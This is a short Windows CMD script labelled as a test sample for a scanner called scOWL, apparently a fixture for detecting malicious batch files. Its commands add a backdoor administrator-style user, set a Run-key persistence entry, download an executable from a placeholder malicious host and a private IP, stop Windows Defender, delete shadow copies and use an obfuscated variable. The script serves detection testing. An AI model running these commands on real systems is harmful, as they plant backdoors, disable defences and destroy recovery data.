@echo off
:: Suspicious CMD script - scOWL test sample (same parser as BAT)
net user backdoor P@ssw0rd123 /add
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v update /t REG_SZ /d "C:\Temp\update.exe"
certutil -urlcache -split -f http://malicious.example.com/update.exe C:\Temp\update.exe
curl -s -o C:\Temp\update.exe http://192.168.1.100/update.exe
sc stop WinDefend
vssadmin delete shadows /all /quiet
set "c%var:~0,1%md=C:\Windows\System32\cmd.exe"